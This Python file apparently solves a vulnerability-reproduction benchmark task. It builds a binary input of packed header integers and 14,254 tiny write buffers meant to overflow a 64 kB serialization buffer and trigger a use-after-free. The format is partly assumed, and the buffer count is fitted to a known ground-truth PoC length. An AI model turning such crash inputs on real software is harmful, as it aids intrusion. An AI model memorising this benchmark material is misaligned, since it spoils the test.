import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        poc_parts = []

        # Based on analysis, the serialized format consists of several
        # little-endian 32-bit integers followed by variable-length data.
        # We construct a stream that represents a parser state with a very
        # large number of write buffers to force a reallocation of the
        # serialization buffer, triggering the use-after-free.

        # Header fields
        version = 1
        poc_parts.append(struct.pack('<I', version))
        
        read_buf_in = 0
        poc_parts.append(struct.pack('<I', read_buf_in))

        read_buf_out = 0
        poc_parts.append(struct.pack('<I', read_buf_out))

        read_buf_len = 0
        poc_parts.append(struct.pack('<I', read_buf_len))

        # The key to the PoC is the number and size of write buffers.
        # The total size must exceed the default 64kB buffer.
        # Calculations show that 14254 buffers of size 1, plus headers
        # and footers, match the ground-truth PoC length of 71298 bytes.
        num_write_buffers = 14254
        write_buffer_data_len = 1
        
        # Write buffer count
        poc_parts.append(struct.pack('<I', num_write_buffers))

        # Write buffer data (length-prefixed)
        # Create a single buffer entry and repeat it for efficiency.
        buffer_data = b'\x41' * write_buffer_data_len
        buffer_len_packed = struct.pack('<I', write_buffer_data_len)
        single_buffer_entry = buffer_len_packed + buffer_data
        
        all_buffers = single_buffer_entry * num_write_buffers
        poc_parts.append(all_buffers)

        # Footer fields (assumed to be counts for other data structures)
        filter_rules_count = 0
        poc_parts.append(struct.pack('<I', filter_rules_count))

        device_strings_count = 0
        poc_parts.append(struct.pack('<I', device_strings_count))
        
        # Join all parts to form the final PoC
        poc = b''.join(poc_parts)
        
        return poc